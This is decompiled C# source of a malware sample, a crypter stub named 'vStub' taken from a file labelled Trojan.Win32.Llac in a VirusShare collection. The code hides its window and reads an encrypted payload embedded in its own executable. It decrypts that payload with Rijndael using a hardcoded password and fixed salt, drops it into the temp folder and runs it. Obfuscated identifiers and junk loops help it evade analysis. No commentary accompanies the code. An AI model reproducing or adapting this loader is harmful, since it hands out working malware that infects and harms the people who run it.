// Decompiled with JetBrains decompiler
// Type: .
// Assembly: vStub, Version=0.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79EA0AF5-6FFC-4851-B824-192B7145FE3B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.cqsc-8cf80c2141bbf71d90fd5aa655a7f90a114e75b24947ad72685fecd758284586.exe

using \u0001;
using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0004
{
  [DesignerGenerated]
  internal class \u0002 : Form
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private IContainer \u0001;
    private string \u0001;
    private string \u0002;

    public \u0002()
    {
      \u0002 obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0003));
      this.\u0002 = Path.GetTempPath();
      this.\u0003();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0003()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (\u0002));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(226, 104);
      this.Icon = (Icon) componentResourceManager.GetObject(\u0002.\u0001(763));
      this.Name = \u0002.\u0001(780);
      this.Text = \u0002.\u0001(789);
      this.ResumeLayout(false);
    }

    private void \u0003(object sender, EventArgs e)
    {
      try
      {
        this.Visible = false;
        this.Hide();
        string Delimiter = \u0002.\u0001(802);
        string password = \u0002.\u0001(819);
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        this.\u0001 = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref this.\u0001);
        FileSystem.FileClose(1);
        string str1 = \u0002.\u0001(836);
        string str2 = \u0002.\u0001(909);
        int num1 = 161;
        long num2 = 1240;
        int num3 = 0;
        do
        {
          str1 = \u0002.\u0001(982);
          str2 = \u0002.\u0001(1055);
          num1 = 2245;
          num2 = 2049L;
          checked { ++num3; }
        }
        while (num3 <= 2);
        string s = Strings.Split(this.\u0001, Delimiter)[1];
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
        try
        {
          byte[] buffer = Convert.FromBase64String(s);
          cryptoStream.Write(buffer, 0, buffer.Length);
          cryptoStream.Close();
          s = Encoding.UTF8.GetString(memoryStream.ToArray());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        FileSystem.FileOpen(1, this.\u0002 + \u0002.\u0001(1128), OpenMode.Binary);
        FileSystem.FilePut(1, s, -1L, false);
        FileSystem.FileClose(1);
        long num4;
        if (num4 == -1L)
        {
          int num5 = (int) Interaction.MsgBox((object) \u0002.\u0001(1145));
        }
        Interaction.Shell(this.\u0002 + \u0002.\u0001(1128), AppWinStyle.NormalFocus);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Close();
      int num6;
      checked { ++num6; }
      int num7 = checked ((int) (1L + 2895728957L));
      int num8;
      checked { ++num8; }
      int num9 = 1;
      num9 = checked ((int) ((long) num7 + 2895728957L));
      int num10 = 1;
      num10 = checked ((int) ((long) num7 + 2895728957L));
    }

    static \u0002() => \u0002.\u0003();
  }
}
